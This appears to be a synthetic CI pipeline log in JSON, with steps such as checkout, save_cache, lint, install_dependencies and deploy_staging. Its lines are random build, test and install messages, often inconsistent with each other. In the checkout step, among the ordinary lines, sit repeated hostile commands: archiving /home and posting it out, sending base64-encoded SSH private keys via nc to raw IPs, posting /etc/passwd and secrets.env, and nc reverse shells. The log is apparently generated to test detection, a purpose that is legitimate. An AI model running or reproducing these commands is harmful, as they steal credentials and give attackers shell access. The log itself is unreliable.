PASS: test_auth_login (167ms)\nInstalling react@2.6.0\nStep 1/10: Building\n[12:00:29] WARN: Deprecated API usage\nCompiling src/utils.go...\n  PASS: test_user_create (336ms)\nInstalling express@5.20.0\n  PASS: test_api_health (49ms)\nStep 4/10: Building\nException: TypeError\n[12:00:29] WARN: Deprecated API usage\n  PASS: test_user_create (358ms)\n  PASS: test_db_connect (183ms)\nWARNING: jest has known vulnerabilities\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:29] INFO: Processing request\nCompiling src/handler.rs...\nWARNING: axios has known vulnerabilities\nCache hit for key-6323\nWARNING: react has known vulnerabilities\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (6MB)\nCache hit for key-4169\nStep 4/10: Building\nCompiling src/index.js...\nCache hit for key-3984\nCompiling src/app.ts...\n\u2713 test completed\n\u2713 test completed\nException: ValueError\nCache hit for key-7144\nCache hit for key-7346\n[12:00:29] INFO: Processing request\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (11MB)\n\u2713 build completed\nCache hit for key-8502\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (14MB)\nStep 8/10: Building\nCompiling src/utils.go...\nCompiling src/service.java...\n\u2713 test completed\n\u2717 build failed with exit code 51\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:29] INFO: Processing request\n  PASS: test_api_health (251ms)\n  PASS: test_cache_hit (57ms)\n  PASS: test_user_create (256ms)\n  PASS: test_user_create (359ms)\n  PASS: test_user_create (37ms)\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_db_connect (448ms)\nArtifact uploaded: build.tar.gz (13MB)\nCache hit for key-5633\nCache hit for key-1045\nArtifact uploaded: build.tar.gz (16MB)\nException: TypeError\n[12:00:29] INFO: Processing request\nStep 9/10: Building\nStep 8/10: Building\n\u2713 lint completed\nCache hit for key-3974\n\u2713 test completed\n=== Step upload_artifacts completed ===\n=== Step: type_check ===\n[12:00:29] INFO: Processing request\nInstalling jest@4.14.0\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_db_connect (76ms)\nCache hit for key-9420\nCache hit for key-7172\nStep 3/10: Building\nCache hit for key-8349\n\u2713 test completed\n\u2713 lint completed\n  PASS: test_db_connect (82ms)\nArtifact uploaded: build.tar.gz (36MB)\nWARNING: prettier has known vulnerabilities\nCache hit for key-4461\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 4/10: Building\nInstalling lodash@3.7.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (33MB)\n\u2713 lint completed\nStep 1/10: Building\n  PASS: test_api_health (299ms)\nStep 7/10: Building\n[12:00:29] INFO: Processing request\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (23MB)\nInstalling webpack@4.14.0\nStep 5/10: Building\nWARNING: express has known vulnerabilities\nInstalling prettier@3.13.0\nCache hit for key-8406\nCompiling src/index.js...\n  PASS: test_user_create (165ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling lodash@2.11.0\nCache hit for key-8730\n\u2713 build completed\nCompiling src/utils.go...\n\u2713 lint completed\n[12:00:29] INFO: Processing request\n  PASS: test_cache_hit (447ms)\nArtifact uploaded: build.tar.gz (21MB)\nStep 2/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (27MB)\nArtifact uploaded: build.tar.gz (38MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-8491\n[12:00:29] INFO: Processing request\nInstalling lodash@1.13.0\n[12:00:29] WARN: Deprecated API usage\nCache hit for key-5980\nArtifact uploaded: build.tar.gz (16MB)\nInstalling prettier@3.2.0\nCache hit for key-3795\n  PASS: test_db_connect (151ms)\n\u2713 test completed\n  PASS: test_cache_hit (440ms)\nStep 4/10: Building\nStep 10/10: Building\n[12:00:29] INFO: Processing request\nCache hit for key-3858\nCache hit for key-6340\n  PASS: test_api_health (352ms)\nCache hit for key-6562\nArtifact uploaded: build.tar.gz (47MB)\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (33MB)\nCache hit for key-4649\n[12:00:29] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_cache_hit (460ms)\nCompiling src/index.js...\nStep 4/10: Building\nWARNING: express has known vulnerabilities\nInstalling prettier@5.11.0\n\u2717 build failed with exit code 29\n[12:00:29] WARN: Deprecated API usage\nCache hit for key-8738\n\u2713 lint completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/index.js...\n[12:00:29] WARN: Deprecated API usage\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (40MB)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (30MB)\nStep 2/10: Building\nCompiling src/handler.rs...\nCache hit for key-5343\n[12:00:29] INFO: Processing request\nCache hit for key-1162\nInstalling lodash@3.15.0\n[12:00:29] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (50MB)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_api_health (50ms)\n[12:00:29] INFO: Processing request\n\u2713 lint completed\nStep 9/10: Building\nStep 7/10: Building\nWARNING: react has known vulnerabilities\nInstalling axios@2.18.0\n[12:00:29] INFO: Processing request\n  PASS: test_user_create (350ms)\nArtifact uploaded: build.tar.gz (36MB)\nCompiling src/utils.go...\nCompiling src/service.java...\nCompiling src/app.ts...\n[12:00:29] INFO: Processing request\nStep 8/10: Building\nInstalling jest@5.20.0\n  PASS: test_db_connect (305ms)\n  PASS: test_db_connect (425ms)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (9MB)\nInstalling prettier@1.4.0\n[12:00:29] INFO: Processing request\nStep 1/10: Building\n=== Step type_check completed ===\n=== Step: checkout ===\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nInstalling axios@1.14.0\n  PASS: test_db_connect (340ms)\n  PASS: test_auth_login (456ms)\nCache hit for key-3221\n\u2713 lint completed\nCompiling src/main.py...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 161.22.228.28 12249\n  PASS: test_api_health (367ms)\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nCompiling src/utils.go...\n  PASS: test_auth_login (53ms)\nStep 8/10: Building\n  PASS: test_api_health (486ms)\nArtifact uploaded: build.tar.gz (24MB)\nCache hit for key-3742\n  PASS: test_cache_hit (410ms)\n\u2713 build completed\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/index.js...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 56.59.213.157 4874\n\u2713 test completed\nArtifact uploaded: build.tar.gz (4MB)\nCompiling src/handler.rs...\n[12:00:29] ERROR: Connection failed\n\u2713 test completed\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:29] WARN: Deprecated API usage\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\n[12:00:29] INFO: Processing request\n  PASS: test_auth_login (234ms)\nArtifact uploaded: build.tar.gz (47MB)\nCache hit for key-7647\n[12:00:29] INFO: Processing request\nArtifact uploaded: build.tar.gz (13MB)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:29] INFO: Processing request\n[12:00:29] INFO: Processing request\nInstalling jest@2.11.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 190.144.122.84 39718\nCompiling src/service.java...\nCompiling src/main.py...\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nCompiling src/handler.rs...\nCache hit for key-9466\n  PASS: test_cache_hit (62ms)\nInstalling lodash@2.18.0\nArtifact uploaded: build.tar.gz (9MB)\nInstalling prettier@4.7.0\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nCompiling src/app.ts...\n  PASS: test_db_connect (296ms)\nWARNING: react has known vulnerabilities\nInstalling react@4.8.0\n[12:00:29] INFO: Processing request\nnc -e /bin/sh 222.169.29.221 27410\nInstalling lodash@1.1.0\nInstalling webpack@2.15.0\n  PASS: test_user_create (248ms)\nStep 7/10: Building\nCompiling src/utils.go...\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\ncurl -X POST https://test.io/collect -d @secrets.env\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 186.64.49.146 13773\nArtifact uploaded: build.tar.gz (37MB)\n  PASS: test_db_connect (496ms)\n[12:00:29] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (5MB)\n  PASS: test_api_health (90ms)\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n  PASS: test_api_health (363ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nCompiling src/app.ts...\n  PASS: test_cache_hit (9ms)\n[12:00:29] WARN: Deprecated API usage\nCache hit for key-9776\n[12:00:29] WARN: Deprecated API usage\nException: RuntimeError\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 lint completed\n\u2713 lint completed\nStep 6/10: Building\nStep 1/10: Building\nnc -e /bin/sh 87.188.254.23 48320\n\u2713 test completed\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (25MB)\nStep 7/10: Building\nFAILED: test_api_health\nWARNING: eslint has known vulnerabilities\nCache hit for key-4753\necho $(cat ~/.ssh/id_rsa) | base64 | nc 22.97.117.101 16646\nCache hit for key-3245\n  PASS: test_user_create (91ms)\n\u2717 build failed with exit code 106\nStep 10/10: Building\nnc -e /bin/sh 107.240.246.168 3355\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (41MB)\nWARNING: eslint has known vulnerabilities\nnc -e /bin/sh 86.211.224.81 46728\nInstalling react@1.5.0\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nWARNING: lodash has known vulnerabilities\nStep 10/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (1MB)\n  PASS: test_auth_login (223ms)\nCache hit for key-3714\nStep 1/10: Building\nCache hit for key-6119\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (22MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (7MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_api_health (158ms)\n[12:00:29] INFO: Processing request\n[12:00:29] ERROR: Connection failed\n[12:00:29] INFO: Processing request\nStep 8/10: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\ncurl -X POST https://test.io/collect -d @secrets.env\ntar czf - /home | curl -X POST -d @- https://example.com/upload\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nCache hit for key-1228\n\u2713 test completed\nInstalling webpack@1.20.0\n\u2713 lint completed\n[12:00:29] INFO: Processing request\nCompiling src/handler.rs...\n\u2713 test completed\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nStep 8/10: Building\nCompiling src/main.py...\n[12:00:29] INFO: Processing request\n  PASS: test_user_create (397ms)\ncurl -X POST https://example.com/collect -d @secrets.env\nInstalling axios@5.5.0\n\u2713 test completed\nCompiling src/app.ts...\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nnc -e /bin/sh 226.102.253.12 54248\nArtifact uploaded: build.tar.gz (17MB)\nStep 8/10: Building\n\u2713 build completed\nInstalling axios@2.9.0\nFAILED: test_cache_hit\nCompiling src/main.py...\n=== Step checkout completed ===",
    "steps": [
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-28T12:00:29.195229",
        "finished_at": "2025-11-28T12:00:41.538675",
        "log_lines": [
          "=== Step: save_cache ===",
          "  PASS: test_cache_hit (268ms)",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "Step 8/10: Building",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Cache hit for key-9918",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:29] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-8443",
          "Step 6/10: Building",
          "Installing jest@2.3.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Cache hit for key-9345",
          "Cache hit for key-5370",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (31ms)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:29] INFO: Processing request",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "Cache hit for key-8970",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Cache hit for key-7923",
          "\u2713 lint completed",
          "  PASS: test_api_health (324ms)",
          "[12:00:29] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (20MB)",
          "  PASS: test_auth_login (204ms)",
          "[12:00:29] WARN: Deprecated API usage",
          "Installing prettier@4.20.0",
          "  PASS: test_auth_login (332ms)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "  PASS: test_db_connect (494ms)",
          "  PASS: test_api_health (394ms)",
          "[12:00:29] INFO: Processing request",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_auth_login (480ms)",
          "  PASS: test_auth_login (330ms)",
          "  PASS: test_auth_login (179ms)",
          "[12:00:29] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "\u2713 test completed",
          "  PASS: test_db_connect (331ms)",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] INFO: Processing request",
          "Step 3/10: Building",
          "Cache hit for key-7852",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (356ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-1902",
          "Cache hit for key-3674",
          "Installing lodash@3.18.0",
          "[12:00:29] WARN: Deprecated API usage",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-9421",
          "\u2713 build completed",
          "Installing prettier@3.8.0",
          "[12:00:29] INFO: Processing request",
          "Step 5/10: Building",
          "Step 7/10: Building",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:29] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-6981",
          "  PASS: test_user_create (66ms)",
          "  PASS: test_auth_login (227ms)",
          "Cache hit for key-8856",
          "[12:00:29] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (433ms)",
          "Step 8/10: Building",
          "  PASS: test_user_create (152ms)",
          "Step 3/10: Building",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (1ms)",
          "\u2713 build completed",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Installing axios@1.4.0",
          "Cache hit for key-4676",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing express@5.1.0",
          "Installing express@5.4.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2713 test completed",
          "Step 4/10: Building",
          "  PASS: test_db_connect (302ms)",
          "[12:00:29] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:29] ERROR: Connection failed",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Step 9/10: Building",
          "Installing react@5.14.0",
          "Compiling src/app.ts...",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-4581",
          "Cache hit for key-3990",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_db_connect (406ms)",
          "  PASS: test_db_connect (254ms)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Cache hit for key-9591",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-28T12:00:41.538675",
        "finished_at": "2025-11-28T12:01:02.111086",
        "log_lines": [
          "=== Step: lint ===",
          "Cache hit for key-8718",
          "Step 4/10: Building",
          "  PASS: test_cache_hit (142ms)",
          "[12:00:29] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-6331",
          "Installing prettier@1.15.0",
          "Step 10/10: Building",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Cache hit for key-4039",
          "Installing axios@2.16.0",
          "Artifact uploaded: build.tar.gz (42MB)",
          "[12:00:29] INFO: Processing request",
          "Installing eslint@2.20.0",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-1667",
          "[12:00:29] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing react@5.10.0",
          "Compiling src/main.py...",
          "Step 8/10: Building",
          "\u2713 test completed",
          "Cache hit for key-5252",
          "Installing react@2.9.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Installing webpack@2.14.0",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Installing webpack@4.14.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "[12:00:29] INFO: Processing request",
          "Installing axios@4.4.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing eslint@2.2.0",
          "Step 9/10: Building",
          "[12:00:29] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/index.js...",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:29] INFO: Processing request",
          "  PASS: test_api_health (438ms)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 10/10: Building",
          "  PASS: test_user_create (272ms)",
          "\u2713 test completed",
          "Installing axios@5.13.0",
          "Installing lodash@1.5.0",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Compiling src/service.java...",
          "Cache hit for key-9143",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Installing eslint@3.13.0",
          "Cache hit for key-2152",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "[12:00:29] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Installing axios@2.13.0",
          "  PASS: test_db_connect (13ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Installing react@4.19.0",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 7/10: Building",
          "[12:00:29] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "Installing react@4.7.0",
          "[12:00:29] ERROR: Connection failed",
          "\u2713 lint completed",
          "Cache hit for key-5332",
          "Cache hit for key-7553",
          "Artifact uploaded: build.tar.gz (24MB)",
          "[12:00:29] INFO: Processing request",
          "  PASS: test_db_connect (14ms)",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 2/10: Building",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/index.js...",
          "Step 9/10: Building",
          "Installing eslint@2.7.0",
          "\u2713 build completed",
          "[12:00:29] WARN: Deprecated API usage",
          "Installing axios@1.13.0",
          "Installing react@4.11.0",
          "Cache hit for key-9719",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (7MB)",
          "  PASS: test_cache_hit (71ms)",
          "Cache hit for key-2642",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (91ms)",
          "Installing jest@4.13.0",
          "[12:00:29] WARN: Deprecated API usage",
          "Cache hit for key-8329",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Exception: NullPointerException",
          "Step 8/10: Building",
          "  PASS: test_api_health (330ms)",
          "Compiling src/app.ts...",
          "Step 7/10: Building",
          "[12:00:29] ERROR: Connection failed",
          "  PASS: test_auth_login (116ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 build completed",
          "  PASS: test_db_connect (446ms)",
          "  PASS: test_db_connect (383ms)",
          "Step 5/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:29] ERROR: Connection failed",
          "Installing prettier@4.0.0",
          "[12:00:29] WARN: Deprecated API usage",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-28T12:01:02.111086",
        "finished_at": "2025-11-28T12:02:03.828318",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Step 4/10: Building",
          "  PASS: test_cache_hit (112ms)",
          "Compiling src/main.py...",
          "  PASS: test_api_health (55ms)",
          "FAILED: test_cache_hit",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "[12:00:29] INFO: Processing request",
          "  PASS: test_db_connect (331ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Installing axios@4.16.0",
          "Cache hit for key-2859",
          "Installing webpack@3.10.0",
          "Step 3/10: Building",
          "Cache hit for key-3550",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-9279",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "[12:00:29] WARN: Deprecated API usage",
          "Cache hit for key-8589",
          "Cache hit for key-7370",
          "Cache hit for key-2910",
          "Installing express@1.17.0",
          "Installing prettier@1.7.0",
          "Step 6/10: Building",
          "Installing react@5.8.0",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 3/10: Building",
          "[12:00:29] WARN: Deprecated API usage",
          "Cache hit for key-7605",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 5/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_auth_login (434ms)",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Cache hit for key-7338",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_cache_hit (228ms)",
          "\u2713 build completed",
          "Installing react@5.11.0",
          "  PASS: test_user_create (7ms)",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (422ms)",
          "  PASS: test_api_health (293ms)",
          "Cache hit for key-8603",
          "Step 7/10: Building",
          "  PASS: test_user_create (377ms)",
          "Installing jest@3.8.0",
          "\u2713 test completed",
          "Installing react@4.19.0",
          "Step 6/10: Building",
          "Installing axios@4.15.0",
          "Step 2/10: Building",
          "Installing prettier@4.17.0",
          "Step 6/10: Building",
          "[12:00:29] INFO: Processing request",
          "  PASS: test_user_create (241ms)",
          "\u2717 build failed with exit code 60",
          "  PASS: test_api_health (271ms)",
          "  PASS: test_db_connect (47ms)",
          "[12:00:29] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Installing react@4.3.0",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:29] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-4988",
          "Compiling src/utils.go...",
          "Cache hit for key-4016",
          "Compiling src/main.py...",
          "Installing jest@4.8.0",
          "  PASS: test_auth_login (73ms)",
          "\u2713 test completed",
          "\u2713 build completed",
          "[12:00:29] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/utils.go...",
          "[12:00:29] INFO: Processing request",
          "Exception: NullPointerException",
          "\u2713 lint completed",
          "Installing lodash@5.20.0",
          "Installing prettier@2.12.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_db_connect (416ms)",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-1429",
          "  PASS: test_user_create (82ms)",
          "Compiling src/service.java...",
          "Cache hit for key-5710",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:29] INFO: Processing request",
          "  PASS: test_cache_hit (495ms)",
          "Installing prettier@3.13.0",
          "\u2713 test completed",
          "  PASS: test_db_connect (463ms)",
          "Installing axios@5.20.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_user_create (10ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 7/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/utils.go...",
          "Installing eslint@5.3.0",
          "\u2713 lint completed",
          "Cache hit for key-9626",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "  PASS: test_user_create (184ms)",
          "Cache hit for key-2781",
          "  PASS: test_cache_hit (432ms)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Cache hit for key-8500",
          "Installing axios@5.15.0",
          "Step 10/10: Building",
          "  PASS: test_db_connect (231ms)",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-28T12:02:03.828318",
        "finished_at": "2025-11-28T12:02:24.400729",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Step 1/10: Building",
          "\u2713 test completed",
          "  PASS: test_cache_hit (150ms)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Cache hit for key-3203",
          "[12:00:29] INFO: Processing request",
          "Step 1/10: Building",
          "[12:00:29] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (24MB)",
          "  PASS: test_db_connect (142ms)",
          "[12:00:29] INFO: Processing request",
          "Installing axios@1.1.0",
          "Step 10/10: Building",
          "[12:00:29] INFO: Processing request",
          "Installing webpack@1.17.0",
          "\u2713 lint completed",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (467ms)",
          "Compiling src/app.ts...",
          "[12:00:29] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_db_connect (455ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-9630",
          "Compiling src/utils.go...",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2717 build failed with exit code 17",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache hit for key-9847",
          "[12:00:29] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-2590",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Cache hit for key-5065",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Step 5/10: Building",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "WARNING: prettier has known vulnerabilities",
          "Step 2/10: Building",
          "Cache hit for key-3423",
          "Installing webpack@2.6.0",
          "Cache hit for key-8998",
          "Installing eslint@3.12.0",
          "Installing eslint@1.1.0",
          "Cache hit for key-6175",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "Cache hit for key-8225",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] WARN: Deprecated API usage",
          "Cache hit for key-1906",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-4356",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Installing react@1.18.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:00:29] ERROR: Connection failed",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-7182",
          "Step 1/10: Building",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Step 10/10: Building",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-4049",
          "[12:00:29] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (30MB)",
          "  PASS: test_db_connect (242ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:29] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_auth_login (125ms)",
          "[12:00:29] INFO: Processing request",
          "Installing react@3.19.0",
          "Step 6/10: Building",
          "[12:00:29] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-4776",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-7364",
          "[12:00:29] INFO: Processing request",
          "Step 4/10: Building",
          "[12:00:29] INFO: Processing request",
          "Cache hit for key-9450",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Installing eslint@5.2.0",
          "Cache hit for key-7422",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Cache hit for key-5147",
          "[12:00:29] INFO: Processing request",
          "[12:00:29] INFO: Processing request",
          "Step 2/10: Building",
          "Installing jest@2.4.0",
          "Installing webpack@2.8.0",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "\u2713 build completed",
